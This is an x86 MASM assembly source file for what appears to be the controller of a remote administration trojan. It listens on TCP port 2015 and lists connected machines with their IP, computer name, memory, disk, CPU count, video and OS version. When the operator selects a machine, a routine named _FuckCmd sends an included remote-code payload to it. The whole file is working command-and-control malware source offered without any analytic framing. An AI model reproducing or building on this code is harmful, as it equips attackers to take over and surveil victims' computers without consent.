.386
.model flat,stdcall
option casemap:none
include windows.inc
include  Macro.inc
include kernel32.inc
includelib kernel32.lib
include user32.inc
includelib user32.lib
include     Ws2_32.inc
includelib  Ws2_32.lib
include        gdi32.inc
includelib        gdi32.lib
IPlogin   struct
  Tbool    dd    ?
  IP       dd    ?
  hsocke   dd    ?
IPlogin   ends
    .data
Heading1        db        "IP地址",0
Heading2        db        "计算机名",0
Heading3        db        "内存",0
Heading4        db        "硬盘总大小",0
Heading5        db        "CPU个数",0
Heading6        db        "视频",0
Heading7        db        "系统版本",0
szpath          db        '1.jpg',0
IDD_DIALOG1     equ         101
IDD_DIALOG2     equ         108
IDC_LIST1       equ         1001
TCP_PORT        equ         2015
IDC_BUTTON1     equ         1003
IDC_EDIT1       equ         1004
IDC_EDIT2       equ         1005
WM_SOCKET       equ	        WM_USER + 100
hSocket		    dd	         ?
szErrBind       db        "端口打开失败了！",0
dengji         IPlogin     200 dup (<0,0,0>)
huancun         dd         2048 dup (?)
    .data?
hWinmain        dd            ?
hCmdMain        dd            ?
hInstance       dd            ?
addrbuffer      sockaddr_in       <>
    .code
	
  include RemoteCode.asm
	
InsertColumn proc  hList
LOCAL lvc:LV_COLUMN
mov lvc.imask,LVCF_TEXT+LVCF_WIDTH
mov lvc.pszText,offset Heading1
mov lvc.lx,100
invoke SendMessage,hList, LVM_INSERTCOLUMN, 0, addr lvc
or lvc.imask,LVCF_FMT
mov lvc.fmt,LVCFMT_CENTER
mov lvc.pszText,offset Heading2
mov lvc.lx,100
invoke SendMessage,hList, LVM_INSERTCOLUMN, 1 ,addr lvc
or lvc.imask,LVCF_FMT
mov lvc.fmt,LVCFMT_CENTER
mov lvc.pszText,offset Heading3
mov lvc.lx,100
invoke SendMessage,hList, LVM_INSERTCOLUMN, 2 ,addr lvc
mov lvc.pszText,offset Heading4
invoke SendMessage,hList, LVM_INSERTCOLUMN, 3 ,addr lvc
mov lvc.pszText,offset Heading5
invoke SendMessage,hList, LVM_INSERTCOLUMN, 4 ,addr lvc
mov lvc.pszText,offset Heading6
mov lvc.lx,100
invoke SendMessage,hList, LVM_INSERTCOLUMN, 5 ,addr lvc
mov lvc.pszText,offset Heading7
invoke SendMessage,hList, LVM_INSERTCOLUMN, 6 ,addr lvc
ret
InsertColumn endp

InsertItem proc uses edi hList,IPaddress,lpFind:DWORD
LOCAL lvi:LV_ITEM
mov edi,lpFind
assume edi:ptr byte
mov lvi.imask,LVIF_TEXT+LVIF_PARAM
mov lvi.iItem,0
mov lvi.iSubItem,0
mov lvi.cchTextMax,MAX_PATH
mov lvi.lParam,0
add edi,1
push IPaddress
pop lvi.pszText
invoke SendMessage,hList, LVM_INSERTITEM,0, addr lvi    ;1
inc lvi.iSubItem
mov lvi.imask,LVIF_TEXT
mov    lvi.pszText,edi
invoke SendMessage,hList, LVM_SETITEM,0, addr lvi    ;2
inc lvi.iSubItem
invoke lstrlen,edi
add    edi,eax
add    edi,1
mov lvi.pszText,edi
invoke SendMessage,hList, LVM_SETITEM,0, addr lvi    ;3
inc lvi.iSubItem
invoke lstrlen,edi
add    edi,eax
add    edi,1
mov lvi.pszText,edi
invoke SendMessage,hList, LVM_SETITEM,0, addr lvi    ;4
inc lvi.iSubItem
invoke lstrlen,edi
add    edi,eax
add    edi,1
mov lvi.pszText,edi
invoke SendMessage,hList, LVM_SETITEM,0, addr lvi    ;5
inc lvi.iSubItem
invoke lstrlen,edi
add    edi,eax
add    edi,1
mov lvi.pszText,edi
invoke SendMessage,hList, LVM_SETITEM,0, addr lvi    ;6
inc lvi.iSubItem
invoke lstrlen,edi
add    edi,eax
add    edi,1
mov lvi.pszText,edi
invoke SendMessage,hList, LVM_SETITEM,0, addr lvi    ;7
ret
InsertItem endp

_Init		proc
		local	@stWsa:WSADATA
		local	@stSin:sockaddr_in

		invoke	WSAStartup,101h,addr @stWsa
		invoke	socket,AF_INET,SOCK_STREAM,0
		mov	hSocket,eax
		invoke	RtlZeroMemory,addr @stSin,sizeof @stSin
		invoke	htons,TCP_PORT
		mov	@stSin.sin_port,ax
		mov	@stSin.sin_family,AF_INET
		mov	@stSin.sin_addr,INADDR_ANY
		invoke	bind,hSocket,addr @stSin,sizeof @stSin
		.if	eax ==	SOCKET_ERROR
			invoke	MessageBox,hWinmain,addr szErrBind,NULL,\
				MB_OK or MB_ICONWARNING
			invoke	SendMessage,hWinmain,WM_CLOSE,0,0
		.else
			invoke	listen,hSocket,5
			invoke	WSAAsyncSelect,hSocket,hWinmain,WM_SOCKET,FD_ACCEPT
		.endif
		ret

_Init		endp

_AddClient  proc  uses  ebx edi esi _hSocket
      local     denglubao:byte
      invoke	WSAAsyncSelect,_hSocket,hWinmain,WM_SOCKET,FD_READ or FD_CLOSE
		xor	ebx,ebx
		mov	esi,offset dengji
		assume esi:ptr IPlogin
		.while	ebx <	200
		     mov  edi,[esi].Tbool
			.if	! edi
				push	_hSocket
				pop	    [esi].hsocke
				mov     [esi].Tbool,1
				mov     eax,addrbuffer.sin_addr
				mov     [esi].IP,eax
				mov     denglubao,1
				mov     ecx,sizeof denglubao
				ret
			.endif
			inc	ebx
			add	esi,sizeof IPlogin
		.endw
		invoke	closesocket,_hSocket
   ret
_AddClient  endp

_RemoveClient  proc  uses esi ebx edi _hSocket,hList
       local  szIPbuffer[16]:byte
	   local  IPinetaddr
	   LOCAL  lvi:LV_ITEM
       mov lvi.imask,LVIF_TEXT+LVIF_PARAM
       mov lvi.iItem,0
       mov lvi.iSubItem,0
       mov lvi.cchTextMax,16
       mov lvi.lParam,0
	   lea ebx,szIPbuffer
       mov lvi.pszText,ebx
       xor	ebx,ebx
	   xor  eax,eax
		mov	esi,offset dengji
		assume esi:ptr IPlogin
		.while	ebx <	200  
		    push [esi].Tbool
            pop   edi
			.if	 edi
			     push  [esi].hsocke
				 pop   edx
			    .if edx == _hSocket
				    mov [esi].Tbool,0
                    mov eax,[esi].IP
					mov IPinetaddr,eax
                    .break
                .endif
            .endif
			inc	ebx
			add	esi,sizeof IPlogin
        .endw
        xor ebx,ebx
		.while	ebx <	200
		 mov lvi.iItem,ebx
         invoke SendMessage,hList, LVM_GETITEM,0, addr lvi
		 invoke inet_addr,addr szIPbuffer
		  .if eax == IPinetaddr
		    invoke SendMessage,hList,LVM_DELETEITEM,ebx,0
			.break
		  .endif
		  inc ebx
        .endw	
        invoke	closesocket,_hSocket		
            ret
_RemoveClient  endp

_FindClient proc uses ebx esi edi _hSocket
        xor	ebx,ebx
		mov	esi,offset dengji
		assume esi:ptr IPlogin
		.while	ebx <	200  
		    push [esi].Tbool
            pop   edi
			.if	 edi
			     push  [esi].hsocke
				 pop   eax
			    .if eax == _hSocket
                    mov eax,[esi].IP
                    ret
                .endif
            .endif
			inc	ebx
			add	esi,sizeof IPlogin
        .endw			
            ret
_FindClient endp

_FindhSocket proc uses ebx esi edi _Client
        xor	ebx,ebx
		mov	esi,offset dengji
		assume esi:ptr IPlogin
		.while	ebx <	200  
		    push [esi].Tbool
            pop   edi
			.if	 edi
			     push  [esi].IP
				 pop   eax
			    .if eax == _Client
                    push [esi].hsocke
					pop  eax
                    ret
                .endif
            .endif
			inc	ebx
			add	esi,sizeof IPlogin
        .endw			
            ret
_FindhSocket endp

_RecvData	proc  uses ebx edi esi eax ecx	_hSocket
local   @lpLastMem,hWinInfo
invoke	GlobalAlloc,GPTR,2048
mov	@lpLastMem,eax
invoke recv,_hSocket,@lpLastMem,2048,NULL
mov    esi,@lpLastMem
assume esi:ptr byte
.if [esi] == 0
    invoke GetDlgItem,hWinmain,IDC_LIST1
	mov   ebx,eax
    invoke _FindClient,_hSocket
    invoke inet_ntoa,eax
    mov   ecx,eax
    invoke InsertItem,ebx,ecx,@lpLastMem
.elseif [esi] == 1
   inc esi
   invoke   GetDlgItem,hCmdMain,IDC_EDIT2
   mov      hWinInfo,eax
   invoke	GetWindowTextLength,hWinInfo
   invoke	SendMessage,hWinInfo,EM_SETSEL,eax,eax
   invoke	SendMessage,hWinInfo,EM_REPLACESEL,FALSE,esi
   ;invoke   MessageBox,NULL,esi,NULL,NULL
.endif
invoke  GlobalFree,@lpLastMem
    assume esi:nothing
ret
_RecvData   endp

_FuckCmd    proc uses edi ebx hList
local  szIPbuffer[16]:byte
LOCAL  lvi:LV_ITEM
mov lvi.imask,LVIF_TEXT+LVIF_PARAM
mov lvi.iItem,0
mov lvi.iSubItem,0
mov lvi.cchTextMax,16
mov lvi.lParam,0
invoke SendMessage,hList, LVM_GETNEXTITEM,-1, LVNI_SELECTED
.if eax == -1
    ret
.endif
mov lvi.iItem,eax
lea ebx,szIPbuffer
mov lvi.pszText,ebx
invoke SendMessage,hList, LVM_GETITEM,0, addr lvi

invoke inet_addr,addr szIPbuffer
invoke _FindhSocket,eax
mov    edi,eax

invoke send,edi,offset REMOTE_CODE_START,REMOTE_CODE_LENGTH,0

invoke  GetDlgItem,hWinmain,IDC_LIST1
		mov     ebx,eax
invoke	_RemoveClient,edi,ebx
       ret
_FuckCmd    endp

_ProcDlgMain1 proc uses ebx edi esi hWnd,wMsg,wParam,lParam
          local changdu
		  local sinaddr:sockaddr_in
		  local	@stPs:PAINTSTRUCT
		  local ThreadID
	   local	@stRect:RECT
	   local	@hDc
         mov	eax,wMsg
		.if	eax ==	WM_CLOSE
			invoke	EndDialog,hWnd,NULL
		.elseif eax ==  WM_COMMAND
		    mov eax,wParam
			.if ax ==  IDC_BUTTON1
			    invoke GetDlgItem,hWinmain,IDC_LIST1
			    mov ebx,eax
			    invoke	CreateThread,NULL,0,offset _FuckCmd,ebx,\
						NULL,addr ThreadID
	            invoke    CloseHandle,eax
			.elseif ax == IDC_LIST1
			    invoke MessageBox,NULL,NULL,NULL,NULL
			.endif
	    .elseif eax ==  WM_PAINT
		    invoke	BeginPaint,hWnd,addr @stPs
			mov	@hDc,eax
			invoke	EndPaint,hWnd,addr @stPs
		.elseif	eax ==	WM_INITDIALOG
		    push  hWnd
			pop   hWinmain
			invoke GetDlgItem,hWinmain,IDC_LIST1
			mov   ebx,eax
			invoke SendMessage,ebx,LVM_SETEXTENDEDLISTVIEWSTYLE,0,LVS_EX_GRIDLINES or LVS_EX_FULLROWSELECT
			invoke InsertColumn,ebx
			invoke	LoadIcon,hInstance,1
			invoke	SendMessage,hWnd,WM_SETICON,ICON_BIG,eax
			invoke _Init
	    .elseif eax ==	WM_SOCKET
			mov	eax,lParam
			.if	ax ==	FD_ACCEPT
			    mov  changdu,sizeof sockaddr_in
				invoke	accept,wParam,addr addrbuffer,addr changdu
				invoke	_AddClient,eax
			.elseif	ax ==	FD_READ
			    invoke	CreateThread,NULL,0,offset _RecvData,wParam,\
						NULL,addr ThreadID
	            invoke    CloseHandle,eax
			.elseif	ax ==	FD_CLOSE
			    invoke  GetDlgItem,hWnd,IDC_LIST1
				mov     ebx,eax
				invoke	_RemoveClient,wParam,ebx
			.endif
		.else
			mov	eax,FALSE
			ret
		.endif
		mov	eax,TRUE
		ret
ret
_ProcDlgMain1 endp

start:
     invoke	GetModuleHandle,NULL
		mov	hInstance,eax
		invoke	DialogBoxParam,hInstance,IDD_DIALOG1,NULL,offset _ProcDlgMain1,NULL
		invoke  ExitProcess,NULL
		end start